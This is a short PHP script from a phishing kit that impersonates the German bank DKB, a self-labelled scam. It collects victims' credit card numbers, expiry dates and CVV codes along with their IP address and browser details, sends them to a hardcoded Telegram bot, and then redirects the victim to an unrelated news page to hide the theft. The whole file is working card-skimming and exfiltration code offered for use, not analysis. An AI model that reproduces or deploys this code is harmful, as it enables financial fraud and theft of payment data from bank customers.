<?php
include "config.php";
if(isset($_GET["go"]) && function_exists(checkapp)){
$ip = getenv("REMOTE_ADDR");

    $message  = "-----------------------DKB-DE----------------------\n";
	$message .= " Credit Card : ".$_POST['cc_number']."\n";
	$message .= " Expiration : ".$_POST['cc_month']."/".$_POST["cc_year"]."\n";
	$message .= " Cvc : ".$_POST['cc_cvv']."\n";
	$message .= "----------------------------------------------#"."\n";
	$message .= " IP        : ".$_SERVER['REMOTE_ADDR'].""."\n";
	$message .= " USERAGENT : ".$_SERVER['HTTP_USER_AGENT'].""."\n";
	$message .= " FULL URL : ".$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'].""."\n";
	$message .= " HTTP REFERRER : ".$_SERVER['HTTP_REFERER'].""."\n";
	$message .= "-------------------------DKB-DE------------------------"."\n";


file_get_contents("https://api.telegram.org/bot5759111738:AAHsW7K_NhXMJOk89TYWrwooJYYCsu8k1Xo/sendMessage?chat_id=-1002097131499&text=" . urlencode($message)."" );

header("Location:https://www.mobiflip.de/shortnews/dkb-geo-blocking/");

}
else {
	echo "DO NOT EDIT THIS SCAM";
}

?>
